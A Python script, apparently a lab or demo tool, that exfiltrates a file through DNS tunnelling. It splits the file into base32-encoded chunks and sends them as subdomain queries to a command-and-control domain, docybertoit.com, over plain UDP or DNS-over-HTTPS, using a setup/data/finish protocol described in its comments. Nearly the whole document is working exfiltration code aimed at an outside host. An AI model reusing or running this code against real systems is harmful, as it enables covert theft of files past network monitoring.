"""
### extract a file using DNS

###
"""

import base64
import uuid
import os
import dns.message
import dns.asyncquery
import dns.asyncresolver
from dns.exception import Timeout
import time
# import requests

file_uuid_str = f'{uuid.uuid4()}'
def send_file_dns_over_udp(filename: str, dns_server: str):

    
    file = open(filename,"rb")
    #data = file.read()
    file_b32_str_list = []  #list of base 32 encoded file chunks
    counter = 0
    while True:
        data = file.read(34)
        if not data:
            break
        b32_byte = base64.b32encode(data)
        b32_str = b32_byte.decode('utf-8')
        file_b32_str_list.append(b32_str)
        
    file.close()

    num_chunks = len(file_b32_str_list)

    """
    C2 codes
    A = setup query
    D = data query
    Z = file upload finished
    1. send setup_query, coded with A and number of file chunks
    2. send file_chunk_query, coded with D, each file chunk identified by its index
    3. send finish_query query with Z, denoting complete
    """

    setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
    send_plaintext_query(query=setup_query, dns_server=dns_server)
    time.sleep(1)
    counter = 0
    for chunk in file_b32_str_list:
        file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
        send_plaintext_query(query=file_chunk_query, dns_server=dns_server)
        counter += 1

    finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
    time.sleep(1)
    send_plaintext_query(query=finish_query,dns_server=dns_server)

    print("Done sending")

def send_plaintext_query(query: str, dns_server: str):
    """sends a query using the dnspython package to the c2 server. 
    """

    #https://dnspython.readthedocs.io/en/stable/query.html#dns.query.udp
    q = dns.message.make_query(query, 'A')
    server = dns_server
    try:
        r = dns.query.udp(q=q, where=server, timeout=.00001)
    except dns.exception.Timeout as e:
        print(f"sending: {query} to {server}")
        return  # this is expected, we don't care about the return query
    except Exception as e:
        print(e)

def send_query_dns_over_https(query: str):


    """sends query using dns over https
    https://dnspython.readthedocs.io/en/latest/query.html#https
    examples: https://github.com/rthalley/dnspython/blob/master/examples/doh.py
    """
    session = requests.sessions.Session()
    q = dns.message.make_query(query, "A")
    server = "https://doh.docybertoit.com/dns"
    try:
        r = dns.query.https(q, where=server, session=session, post=False, timeout=0.1)
    except dns.exception.Timeout as e:
        print(f"sending: {query} to {server}")
        return  # this is expected, we don't care about the return query
    except Exception as e:
        print(e)
    finally:
        session.close
    return
    
def send_file_dns_over_https(filename):
    file = open(filename,"rb")
    #data = file.read()
    file_b32_str_list = []  #list of base 32 encoded file chunks
    counter = 0
    while True:
        data = file.read(34)
        if not data:
            break
        b32_byte = base64.b32encode(data)
        b32_str = b32_byte.decode('utf-8')
        file_b32_str_list.append(b32_str)
        
    file.close()

    num_chunks = len(file_b32_str_list)

    """
    C2 codes
    A = setup query
    D = data query
    Z = file upload finished
    1. send setup_query, coded with A and number of file chunks
    2. send file_chunk_query, coded with D, each file chunk identified by its index
    3. send finish_query query with Z, denoting complete
    """

    setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
    send_query_dns_over_https(setup_query)
    time.sleep(1)
    counter = 0
    for chunk in file_b32_str_list:
        file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
        send_query_dns_over_https(file_chunk_query)
        counter += 1
        time.sleep(0.5)

    finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
    time.sleep(1)
    send_query_dns_over_https(finish_query)

if __name__ == "__main__":
    send_file_dns_over_udp(filename="smiley.jpg", dns_server="10.0.10.140")
    #send_file_dns_over_https(filename="test_send.txt")